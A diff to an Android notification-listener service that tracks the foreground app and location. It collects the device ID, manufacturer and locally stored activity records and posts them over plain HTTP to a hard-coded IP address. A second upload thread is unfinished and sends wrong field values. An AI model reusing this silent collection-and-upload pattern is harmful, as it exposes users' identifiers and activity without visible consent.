@@ -18,6 +18,7 @@ import android.service.notification.StatusBarNotification;
 import android.support.v4.app.ActivityCompat;
 import android.telephony.TelephonyManager;
 
+import com.android.internal.http.multipart.MultipartEntity;
 import com.baidu.location.LocationClient;
 import com.baidu.location.LocationClientOption;
 import com.example.cam.DB.DatabaseHelper;
@@ -31,12 +32,21 @@ import org.apache.http.HttpEntity;
 import org.apache.http.client.entity.UrlEncodedFormEntity;
 import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.message.BasicNameValuePair;
+import org.apache.http.protocol.HTTP;
 
+import java.io.BufferedReader;
+import java.io.DataOutputStream;
 import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
 import java.io.UnsupportedEncodingException;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.LinkedList;
 import java.util.List;
+import java.util.Map;
 
 
 /**
@@ -86,7 +96,7 @@ public class RecoreServer extends NotificationListenerService {
         mLocClient = MyApplication.mLocationClient;
         setLocationOption();
         //just for test
-//        new uploadTask().execute();
+//        new uploadThread().start();
         //启动线程，不断检测当前应用
         new Thread(new Runnable() {
             @Override
@@ -114,7 +124,7 @@ public class RecoreServer extends NotificationListenerService {
                             if (needUpload) {
                                 if (NetworkUtil.isGprsConnected(MyApplication.getAppInstance()) == 1
                                         || NetworkUtil.isWifiConnected(MyApplication.getAppInstance()) == 1) {
-                                    new uploadTask().execute();
+                                    new uploadThread().start();
                                 }
                             }
 //                            needUpload = false;
@@ -250,27 +260,54 @@ public class RecoreServer extends NotificationListenerService {
         mLocClient.setLocOption(option);
     }
 
-    class uploadTask extends AsyncTask {
+    class uploadThread extends Thread {
 
         @Override
-        protected Object doInBackground(Object[] params) {
+        public void run() {
+            super.run();
+            System.out.println("thread begin upload -> ");
             String phone = android.os.Build.MANUFACTURER;
             TelephonyManager tm = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
             String deviceId = tm.getDeviceId();
             String data = MyApplication.getmDbHelper().outputAllNewRecore();
-            String url = "http://120.24.65.236:8080/JCtest/index.jsp";
-            LinkedList<BasicNameValuePair> uploadParams = new LinkedList<BasicNameValuePair>();
-            uploadParams.add(new BasicNameValuePair("phone", "phone"));
-            uploadParams.add(new BasicNameValuePair("mac", "deviceId"));
-            uploadParams.add(new BasicNameValuePair("log", "data"));
+//            String url = "http://120.24.65.236:8080/JCtest/index.jsp";
+            String url = "http://120.24.65.236:8080/JCtest/saveLogAction.action";
+            List<BasicNameValuePair> uploadParams = new ArrayList<BasicNameValuePair>();
+            uploadParams.add(new BasicNameValuePair("phone", phone));
+            uploadParams.add(new BasicNameValuePair("mac", deviceId));
+            uploadParams.add(new BasicNameValuePair("log", data));
 
             try {
                 org.apache.http.client.HttpClient httpClient = new DefaultHttpClient();
                 org.apache.http.client.methods.HttpPost postMethod = new org.apache.http.client.methods.HttpPost(url);
-                postMethod.setEntity((HttpEntity) new UrlEncodedFormEntity(uploadParams, "utf-8")); //将参数填入POST Entity中
+                postMethod.setEntity(new UrlEncodedFormEntity(uploadParams, HTTP.UTF_8)); //将参数填入POST Entity中
                 org.apache.http.HttpResponse response = httpClient.execute(postMethod); //执行POST方法
+                System.out.println("result -> " + response.getStatusLine());
                 if (response.getStatusLine().toString().contains("200")) {
                     needUpload = false;
+
+                    HttpEntity httpEntity = response.getEntity();
+                    try
+                    {
+                        InputStream inputStream = httpEntity.getContent();
+                        BufferedReader reader = new BufferedReader(new InputStreamReader(
+                                inputStream));
+                        String result = "";
+                        String line = "";
+                        while (null != (line = reader.readLine()))
+                        {
+                            result += line;
+
+                        }
+
+                        System.out.println(result);
+                        System.out.println("Response Content from server: " + result);
+                    }
+                    catch (Exception e)
+                    {
+                        e.printStackTrace();
+                    }
+
                 } else {
                     needUpload = true;
                 }
@@ -281,8 +318,97 @@ public class RecoreServer extends NotificationListenerService {
             } catch (IOException e) {
                 e.printStackTrace();
             }
-
-            return null;
         }
+    }
+
+    class uploadThread2 extends Thread {
+        String multipart_form_data = "multipart/form-data";
+        String twoHyphens = "--";
+        String boundary = "****************fD4fH3gL0hK7aI6";    // 数据分隔符
+        String lineEnd = System.getProperty("line.separator");
+
+        @Override
+        public void run() {
+            super.run();
+            HttpURLConnection conn = null;
+            DataOutputStream output = null;
+            BufferedReader input = null;
+
+            String phone = android.os.Build.MANUFACTURER;
+            TelephonyManager tm = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
+            String deviceId = tm.getDeviceId();
+            String data = MyApplication.getmDbHelper().outputAllNewRecore();
+            Map<String, String> allParams = new HashMap<String, String>();
+            allParams.put("phone", phone);
+            allParams.put("mac", phone);
+            allParams.put("log", phone);
+
+            try {
+                URL url = new URL("http://120.24.65.236:8080/JCtest/index.jsp");
+                conn = (HttpURLConnection) url.openConnection();
+                conn.setConnectTimeout(120000);
+                conn.setDoInput(true);        // 允许输入
+                conn.setDoOutput(true);        // 允许输出
+                conn.setUseCaches(false);    // 不使用Cache
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Connection", "keep-alive");
+                conn.setRequestProperty("Content-Type", multipart_form_data + "; boundary=" + boundary);
+
+                conn.connect();
+                output = new DataOutputStream(conn.getOutputStream());
+
+                StringBuilder sb = new StringBuilder();
+
+                for(Map.Entry<String, String> param : allParams.entrySet()) {
+                    sb.append(twoHyphens + boundary + lineEnd);
+                    sb.append("Content-Disposition: form-data; name=\"" + param.getKey() + "\"" + lineEnd);
+                    sb.append(lineEnd);
+                    sb.append(param.getValue() + lineEnd);
+                }
+                try {
+                    output.writeBytes(sb.toString());// 发送表单字段数据
+                } catch (IOException e) {
+                    throw new RuntimeException(e);
+                }
+
+                output.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);// 数据结束标志
+                output.flush();
+
+                int code = conn.getResponseCode();
+                if(code != 200) {
+                    throw new RuntimeException("请求‘" + url +"’失败！");
+                }
+
+                input = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+                StringBuilder response = new StringBuilder();
+                String oneLine;
+                while((oneLine = input.readLine()) != null) {
+                    response.append(oneLine + lineEnd);
+                }
+                System.out.println("result -> " + response.toString());
+
+            } catch (IOException e) {
+                throw new RuntimeException(e);
+            } finally {
+                // 统一释放资源
+                allParams.clear();
+                try {
+                    if(output != null) {
+                        output.close();
+                    }
+                    if(input != null) {
+                        input.close();
+                    }
+                } catch (IOException e) {
+                    throw new RuntimeException(e);
+                }
+
+                if(conn != null) {
+                    conn.disconnect();
+                }
+            }
+
+        }
+
     }
 }
